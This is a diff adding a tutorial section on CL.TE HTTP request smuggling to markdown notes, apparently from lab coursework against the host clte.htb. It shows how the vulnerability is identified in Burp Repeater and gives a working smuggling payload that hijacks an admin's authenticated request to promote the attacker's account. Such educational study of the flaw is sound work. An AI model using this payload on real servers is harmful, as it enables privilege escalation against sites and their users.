@@ -5,6 +5,7 @@
     - [Desynchronization](#desynchronization)
 - [CL.TE](#clte)
     - [Identification](#identification)
+    - [Exploitation](#exploitation)
 
 
 ## Overview
@@ -158,3 +159,70 @@ Host: clte.htb
 ### Identification
 - To do so, we can use the two requests shown above. 
 - Copy the requests to two separate tabs in Burp Repeater. Quickly send the two requests after each other to observe the behavior described above. The first response contains the index of the web application:
+![clte2](/images/clte_2.jpg)
+- If we now send the second request immediately afterward, we can observe that the web server responds with the HTTP 405 status code for the reasons discussed above:
+![clte3](/images/clte_3.jpg)
+- Thus, we successfully confirmed that the setup is vulnerable to a CL.TE request smuggling vulnerability since we influenced the second request with the first one.
+
+### Exploitation
+- Let's assume we want to force the admin user to promote our low-privilege user account to an admin user which can be done with the endpoint `/admin.php?promote_uid=2` where our user id is 2. We can force the admin user to do so by sending the following request:
+```http
+POST / HTTP/1.1
+Host: clte.htb
+Content-Length: 52
+Transfer-Encoding: chunked
+
+0
+
+POST /admin.php?promote_uid=2 HTTP/1.1
+Dummy: 
+```
+- If we wait for the admin user to access the page, our user has been promoted. So let's investigate what exactly happened.
+- The admin user accesses the page using his session cookie with a request like this:
+```http
+GET / HTTP/1.1
+Host: clte.htb
+Cookie: sess=<admin_session_cookie>
+```
+- This request is benign. The admin user simply accesses the index of the website, so no action should be taken. Let's look at the TCP stream from the reverse proxy's view:
+```
+POST / HTTP/1.1
+Host: clte.htb
+Content-Length: 52
+Transfer-Encoding: chunked
+
+0
+
+POST /admin.php?promote_uid=2 HTTP/1.1
+Dummy: 
+```
+```http
+GET / HTTP/1.1
+Host: clte.htb
+Cookie: sess=<admin_session_cookie>
+```
+- The reverse proxy uses the CL header to determine the length of the first request such that it ends just after `Dummy: `. The reverse proxy sees a POST request to / by us and a GET request to / by the admin user.
+
+- Now let's look at the TCP stream from the web server's view:
+```http
+POST / HTTP/1.1
+Host: clte.htb
+Content-Length: 52
+Transfer-Encoding: chunked
+
+0
+
+
+```
+```http
+POST /admin.php?promote_uid=2 HTTP/1.1
+Dummy: GET / HTTP/1.1
+Host: clte.htb
+Cookie: sess=<admin_session_cookie>
+```
+- Since the web server correctly uses the chunked encoding, it determines that the first request ends with the empty chunk. 
+- The web server thus sees a POST request to / by us and a POST request to `/admin.php?promote_uid=2` by the admin user. 
+- Since the admin user's request is authenticated and the session cookie sent along the request, we successfully forced the admin user to grant our user admin rights without the admin user even knowing what happened.
+
+> [!NOTE]
+> We need to add a separate line with the Dummy keyword to our first request to "hide" the first line of the admin user's request as an HTTP header value to preserve the syntax of the request's header section.
